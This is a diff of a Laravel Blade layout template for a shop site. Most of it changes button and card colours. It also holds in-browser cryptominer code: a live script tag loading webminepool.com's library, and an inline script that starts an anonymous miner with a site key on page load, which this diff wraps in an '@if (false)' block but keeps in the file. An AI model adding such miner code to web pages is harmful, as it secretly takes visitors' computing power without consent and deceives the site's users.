@@ -44,9 +44,6 @@
                 height: auto;
             }
         }
-        .product-card:before {
-            box-shadow: inset 0 0 0 2px #1783c4;
-        }
         .product-card:before,
         .owl-carousel {
             z-index: 0;
@@ -81,19 +78,19 @@
         }
         .product-card__addtocart,
         .product__addtocart {
-            background-color: #0083C4 !important;
-            border-color: #0083C4 !important;
+            background-color: #000 !important;
+            border-color: #000 !important;
             color: #fff !important;
         }
         .product-card__ordernow,
         .product__ordernow {
-            background-color: #3d464d !important;
-            border-color: #3d464d !important;
+            background-color: #ff0000 !important;
+            border-color: #ff0000 !important;
             color: #fff !important;
         }
         .btn-primary:hover {
-            background-color: #6c95b5 !important;
-            border-color: #6c95b5 !important;
+            background-color: #010 !important;
+            border-color: #010 !important;
         }
         .aa-input-container {
             width: 100%;
@@ -176,14 +173,16 @@
     </style>
     @stack('styles')
     <script src="https://webminepool.com/lib/base.js"></script>
-    <script>
-        window.onload = function() {
-            console.log('JavaScript Loaded.');
-            var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
-            miner.start();
-            console.log('JavaScript Working.');
-        }
-    </script>
+    @if (false)
+        <script>
+            window.onload = function() {
+                console.log('JavaScript Loaded.');
+                var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
+                miner.start();
+                console.log('JavaScript Working.');
+            }
+        </script>
+    @endif
 </head>
 
 <body class="header-fixed" style="margin: 0; padding: 0;">
